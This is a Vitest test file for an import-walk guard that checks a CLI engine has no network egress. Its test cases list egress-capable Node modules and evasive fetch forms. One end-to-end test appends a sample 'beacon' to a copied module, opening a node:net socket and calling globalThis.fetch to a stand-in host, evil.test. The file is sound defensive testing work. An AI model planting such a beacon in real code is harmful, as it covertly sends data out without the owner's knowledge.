import { appendFileSync, cpSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  ALLOWED_NODE_BUILTINS,
  extractImports,
  walkImports,
} from "../lib/import-walk.ts";

const REPO_ROOT = process.cwd();

/**
 * THE GUARD'S OWN GUARD — the checker that certifies "$0, zero network,
 * structurally enforced" is itself certified here (2026-07-26).
 *
 * WHY: the previous import-graph eval was GREEN while a beacon ran on the CLI
 * path. It had never been tested against the bypasses it needed to catch — only
 * against the two it was written for (`node:https`, bare `fetch(`). A detector
 * validated solely on the shapes it was designed against tells you nothing about
 * the shapes it wasn't; that is the same lesson the injection-scan work landed
 * one day earlier, and it recurred here in a load-bearing security claim.
 *
 * So every case below is a KNOWN-POSITIVE (must be caught) or a KNOWN-NEGATIVE
 * (must be left alone). A checker with only known-positives is a false-positive
 * generator; one with only known-negatives is decorative.
 *
 * The three real bypasses, each verified against the OLD implementation before
 * this was written:
 *   `node:net` / `node:tls` / `node:dgram` / `node:worker_threads` /
 *   `node:child_process` all passed the denylist · `globalThis.fetch(` and
 *   `(0,fetch)(` passed the source scan · `import(mod)` was invisible to the
 *   specifier extractor, leaving the subtree unwalked as well as unbanned.
 */

function fixtureDir(): string {
  return mkdtempSync(join(tmpdir(), "import-walk-guard-"));
}

/**
 * Write a throwaway "repo" and walk it. Extra files are written BEFORE the walk
 * and into the SAME temp dir as the entry — an earlier cut created the entry and
 * the extras in different dirs, so the transitive case silently walked a file
 * that did not exist and reported a clean result. A fixture bug in a guard's own
 * test reads exactly like the guard passing.
 */
function walkSource(src: string, opts: { extraFiles?: Record<string, string> } = {}) {
  const dir = fixtureDir();
  mkdirSync(join(dir, "lib"), { recursive: true });
  for (const [rel, body] of Object.entries(opts.extraFiles ?? {})) {
    writeFileSync(join(dir, rel), body);
  }
  const entry = join(dir, "entry.mjs");
  writeFileSync(entry, src);
  return walkImports(entry, { root: dir });
}

describe("import-walk guard — KNOWN POSITIVES: every verified bypass is caught", () => {
  const EGRESS_BUILTINS = [
    "node:net",
    "node:tls",
    "node:dgram",
    "node:http",
    "node:https",
    "node:http2",
    "node:worker_threads",
    "node:child_process",
  ];

  it.each(EGRESS_BUILTINS)("catches the egress-capable builtin %s", (mod) => {
    const { violations } = walkSource(`import x from "${mod}";\nexport const y = x;\n`);
    expect(violations.filter((v) => v.kind === "module")).toHaveLength(1);
    expect(violations[0].detail).toContain(mod);
  });

  const NETWORK_CALLS = [
    ["bare fetch", `export async function f(){ return fetch("https://x.test"); }`],
    ["globalThis.fetch", `export async function f(){ return globalThis.fetch("https://x.test"); }`],
    ["indirect (0,fetch)", `export async function f(){ return (0,fetch)("https://x.test"); }`],
    ["aliased globalThis.fetch", `const g = globalThis.fetch; export const f = () => g("https://x.test");`],
    ["XMLHttpRequest", `export function f(){ const r = new XMLHttpRequest(); return r; }`],
    ["WebSocket", `export function f(){ return new WebSocket("wss://x.test"); }`],
    ["sendBeacon", `export function f(){ return navigator.sendBeacon("/x", "d"); }`],
  ] as const;

  it.each(NETWORK_CALLS)("catches the network call: %s", (_label, src) => {
    const { violations } = walkSource(src);
    expect(violations.some((v) => v.kind === "network-call")).toBe(true);
  });

  it("catches a NON-LITERAL dynamic import (unanalyzable is not acceptable here)", () => {
    const { violations } = walkSource(`const mod = "node:" + "net";\nexport const p = import(mod);\n`);
    expect(violations.some((v) => v.kind === "unanalyzable-import")).toBe(true);
  });

  it("catches a banned module hidden BEHIND a relative import (the walk is transitive)", () => {
    // Written explicitly rather than through the helper: this case needs the hop
    // file on disk BEFORE the walk, and routing it through a shared helper is
    // what made an earlier cut silently walk a file that did not exist — a
    // fixture bug in a guard's own test reads exactly like the guard passing.
    const dir = fixtureDir();
    mkdirSync(join(dir, "lib"), { recursive: true });
    writeFileSync(join(dir, "lib", "hop.mjs"), `import net from "node:net";\nexport default net;\n`);
    const entry = join(dir, "entry.mjs");
    writeFileSync(entry, `import "./lib/hop.mjs";\n`);
    const { violations, seen } = walkImports(entry, { root: dir });
    // The walk must actually REACH the hop file, or the assertion below is vacuous.
    expect([...seen].some((f) => f.endsWith("hop.mjs")), "the walk never reached lib/hop.mjs").toBe(true);
    expect(
      violations.some((v) => v.kind === "module" && v.detail.includes("node:net")),
      `reached the hop file but did not flag it; violations = ${JSON.stringify(violations)}`,
    ).toBe(true);
  });

  it("catches an LLM provider package by DEFAULT — no pattern needed", () => {
    // The allowlist's central property: a module nobody wrote a rule for still
    // fails. The old denylist needed `groq|gemini|@ai-sdk` spelled out.
    for (const pkg of ["@anthropic-ai/sdk", "openai", "some-future-llm-client", "undici", "axios"]) {
      const { violations } = walkSource(`import x from "${pkg}";\nexport default x;\n`);
      expect(violations.some((v) => v.kind === "module"), `${pkg} slipped through`).toBe(true);
    }
  });
});

describe("import-walk guard — KNOWN NEGATIVES: legitimate code is left alone", () => {
  it("permits the builtins the engine actually uses", () => {
    const src = ALLOWED_NODE_BUILTINS.slice(0, 6)
      .map((b, i) => `import m${i} from "${b}";`)
      .join("\n");
    const { violations } = walkSource(`${src}\nexport const ok = true;\n`);
    expect(violations).toEqual([]);
  });

  it("permits ajv (the deterministic schema validator the conformance leg needs)", () => {
    const { violations } = walkSource(`import Ajv from "ajv";\nimport af from "ajv-formats";\nexport const x = [Ajv, af];\n`);
    expect(violations).toEqual([]);
  });

  it("does NOT flag `.fetch(` on an unrelated object, or a word containing fetch", () => {
    const src = `const cache = { fetch: (k) => k };\nexport const a = cache.fetch("k");\nexport const b = "prefetch(x)";\nexport function refetch(){ return 1; }\n`;
    const { violations } = walkSource(src);
    expect(violations.filter((v) => v.kind === "network-call")).toEqual([]);
  });

  it("does NOT flag `import.meta` as an unanalyzable dynamic import", () => {
    const { violations } = walkSource(`export const u = import.meta.url;\n`);
    expect(violations.filter((v) => v.kind === "unanalyzable-import")).toEqual([]);
  });

  it("does NOT flag a LITERAL dynamic import of an allowed module", () => {
    const { violations } = walkSource(`export const p = import("node:path");\n`);
    expect(violations).toEqual([]);
  });
});

/**
 * THE END-TO-END REGRESSION — the exact payload that defeated the OLD eval.
 *
 * The capability sweep did not argue the old check was weak; it mirrored the
 * CLI, wired a `node:net` socket and a `globalThis.fetch` beacon into the demo
 * path, ran `node bin/check.mjs demo`, watched `[EGRESS CODE RAN on the CLI
 * path]` print — and watched the eval report `PASS (no violations found)`.
 *
 * This reproduces that payload against the REAL engine sources (mirrored to a
 * temp dir, never mutating the repo) and asserts the guard now catches it on
 * both counts. It is the difference between "the checker looks stronger" and
 * "the checker stops the thing that got through".
 */
describe("import-walk guard — the beacon that defeated the old eval is caught", () => {
  it("flags BOTH the node:net import and the globalThis.fetch call on a real engine walk", () => {
    const dir = fixtureDir();
    // Mirror the real CLI + engine, then inject the payload into a reachable module.
    cpSync(join(REPO_ROOT, "bin"), join(dir, "bin"), { recursive: true, dereference: true });
    cpSync(join(REPO_ROOT, "lib"), join(dir, "lib"), { recursive: true, dereference: true });
    const victim = join(dir, "lib", "packs", "listings", "acp-feed.ts");
    appendFileSync(
      victim,
      `\n// injected egress (test-only)\nimport { Socket } from "node:net";\nexport function beacon(){ const s = new Socket(); globalThis.fetch("https://evil.test/x"); return s; }\n`,
    );

    const { violations, seen } = walkImports(join(dir, "bin", "check.mjs"), { root: dir });

    // The walk must have actually traversed the engine, or this proves nothing.
    expect(seen.size, "the walk did not traverse the mirrored engine").toBeGreaterThan(10);
    expect(violations.some((v) => v.kind === "module" && v.detail.includes("node:net"))).toBe(true);
    expect(violations.some((v) => v.kind === "network-call" && v.detail.includes("globalThis.fetch"))).toBe(true);
  });

  it("CONTROL: the same mirror WITHOUT the injection is clean", () => {
    // Without this, the test above could pass because the walk flags something
    // the engine already contains — the control proves the engine itself is
    // clean and the violations come from the injected payload alone.
    const dir = fixtureDir();
    cpSync(join(REPO_ROOT, "bin"), join(dir, "bin"), { recursive: true, dereference: true });
    cpSync(join(REPO_ROOT, "lib"), join(dir, "lib"), { recursive: true, dereference: true });
    const { violations, seen } = walkImports(join(dir, "bin", "check.mjs"), { root: dir });
    expect(seen.size).toBeGreaterThan(10);
    expect(violations, `unmodified engine reported: ${JSON.stringify(violations)}`).toEqual([]);
  });
});

describe("import-walk guard — the extractor sees both literal and non-literal forms", () => {
  it("collects literal specifiers from every import shape", () => {
    const { specs } = extractImports(
      `import a from "one";\nimport { b } from 'two';\nimport "three";\nconst c = await import("four");\nconst d = require("five");\n`,
    );
    expect(specs).toEqual(["one", "two", "three", "four", "five"]);
  });

  it("reports non-literal dynamic imports instead of silently dropping them", () => {
    const { specs, unanalyzable } = extractImports(`const m = pick();\nexport const p = import(m);\n`);
    expect(specs).toEqual([]);
    expect(unanalyzable).toHaveLength(1);
  });
});
